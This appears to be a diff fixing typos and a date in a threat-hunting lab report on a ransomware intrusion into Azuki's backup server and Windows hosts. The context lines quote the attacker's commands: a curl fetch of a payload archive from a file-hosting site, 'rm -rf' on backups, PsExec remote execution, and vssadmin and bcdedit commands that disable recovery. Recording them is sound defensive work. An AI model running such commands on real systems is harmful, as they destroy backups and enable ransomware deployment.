@@ -39,7 +39,7 @@ On November 19, 2025, at 18:36UTC, Azuki Import/Export Trading Co. was compromis
 ### **Attack Overview**
 
 - **Affected Systems:** azuki-sl, azuki-adminPC, azuki-FS01, azuki-BackupSrv
-- **Comprimised Account:** backup-admin
+- **Compromised Account:** backup-admin
 - **Operating Systems:** Windows 11, Linux Ubuntu 22.04
 - **Investigation Tool:** Azure Log Analytics Workspace
   
@@ -68,7 +68,7 @@ On November 19, 2025, at 18:36UTC, Azuki Import/Export Trading Co. was compromis
 
 **Finding**: `ssh.exe backup-admin@10.1.0.189` was ran on `azuki-adminpc` to remote into `Azuki-backupsrv` at `2025-11-25T05:39:10.889728Z`
 
-**Thoughts**: Because I knew the Backup Server was a Linux machine, I wanted to search for SSH connections. I decided to query for commands ran from any machine in the network that included the IP address of the server.
+**Thoughts**: Because I knew the Backup Server was a Linux machine, I wanted to search for SSH connections. I decided to query for commands run from any machine in the network that included the IP address of the server.
 
 **KQL Query**:
 ```
@@ -140,7 +140,7 @@ DeviceProcessEvents
 
 **Finding**: `curl -L -o destroy.7z https[:]//litter[.]catbox[.]moe/io523y[.]7z` at `2025-11-25T05:45:34.259149Z`  
 
-**Thoughts**: the `Curl` command is the easiest method to download contents from a website via CMD
+**Thoughts**: the `Curl` command is the easiest method to download content from a website via CMD
 
 **KQL Query**:
 ```
@@ -173,7 +173,7 @@ DeviceProcessEvents
 
 **Finding**: The attacker ran `systemctl stop cron`, `systemctl disable cron`, and  `rm -rf /backups/archives` starting at `2025-11-25T05:47:02.660493Z `  
 
-**Thoughts**: The `systemctl` command is used to manage system services. I paired it with `stop` and `disable` to query for commands ran with all 3. The `rm` command is used to delete files. I used it in combination with `backups` to check if any files had been deleted in the backups directory.
+**Thoughts**: The `systemctl` command is used to manage system services. I paired it with `stop` and `disable` to query for commands run with all 3. The `rm` command is used to delete files. I used it in combination with `backups` to check if any files had been deleted in the backups directory.
 
 **KQL Query**:
 ```
@@ -200,7 +200,7 @@ DeviceProcessEvents
 
 ## :triangular_flag_on_post: Flag 13 & 14 – What tool did the attacker use to execute commands on remote systems?
 
-**Finding**: The attacker ran `PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` at `2025-11-25T06:03:47.8997504Z`.
+**Finding**: The attacker ran `PsExec64.exe \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe` at `2025-11-25T06:03:47.8997504Z`.
 
 **Tool Used**: `PsExec64.exe`
 
@@ -260,7 +260,7 @@ DeviceProcessEvents
 
 ## :triangular_flag_on_post: Flag 19 - 22 – How did the attacker inhibit system recovery?
 
-**Finding**: The attacker ran `vssadmin.exe delete shadows /all /quiet` to delete recovery points. Next, they ran `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB`, which limited the recovery storage size. Finally, they ran `"bcdedit.exe" /set -encodedCommand ZABlAGYAYQB1AGwAdAA= recoveryenabled No `, when Base64 decoded, the command reads `bcdedit /set {default} recoveryenabled No`. This final command disabled system recovery.
+**Finding**: The attacker ran `vssadmin.exe delete shadows /all /quiet` to delete recovery points. Next, they ran `vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB`, which limited the recovery storage size. Finally, they ran `"bcdedit.exe" /set -encodedCommand ZABlAGYAYQB1AGwAdAA= recoveryenabled No `. When the command is Base64 decoded, it reads `bcdedit /set {default} recoveryenabled No`. This final command disabled system recovery.
 
 **Thoughts**: I discovered `vssadmin.exe`, `bcdedit.exe`, and `wbadmin` all from the Mitre article on ID: `T1490` (Inhibit System Recovery).
 
@@ -289,7 +289,7 @@ DeviceProcessEvents
 
 **Registry Key**: `HKEY_CURRENT_USER\S-1-5-21-3215208035-517803886-2772267501-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
 
-**Thoughts**: Looking at Mitre ID: `T1547.001` (Boot or Logon Autostart Execution), I found that `HKEY_C_U\Software\...\CurrentVersion\Run` and `HKEY_L_M\Software\...\CurrentVersion\Run` are default Windows run keys. I wanted to query for any registry edits that included `CurrentVersion\Run`. Next, I queried for any commands ran that included `schtasks`.
+**Thoughts**: Looking at Mitre ID: `T1547.001` (Boot or Logon Autostart Execution), I found that `HKEY_C_U\Software\...\CurrentVersion\Run` and `HKEY_L_M\Software\...\CurrentVersion\Run` are default Windows run keys. I wanted to query for any registry edits that included `CurrentVersion\Run`. Next, I queried for any commands run that included `schtasks`.
 
 **KQL Query**:
 ```
@@ -356,8 +356,8 @@ DeviceFileEvents
 ### 🔹 **Ip addresses**
 | System | IP |
 |------|----------|
-| 1st connection to Backup sever  | **10.1.0.108** |
-| Backup sever  | **10.1.0.189** |
+| 1st connection to Backup server  | **10.1.0.108** |
+| Backup server  | **10.1.0.189** |
 | Windows Target  | **10.1.0.102** |
 
 ### 🔹 **Ransom Note**
@@ -368,4 +368,4 @@ DeviceFileEvents
 
 **Report Completed By:** Edward Campbell
 
-**Date:** 7 January 2025
+**Date:** 7 January 2026
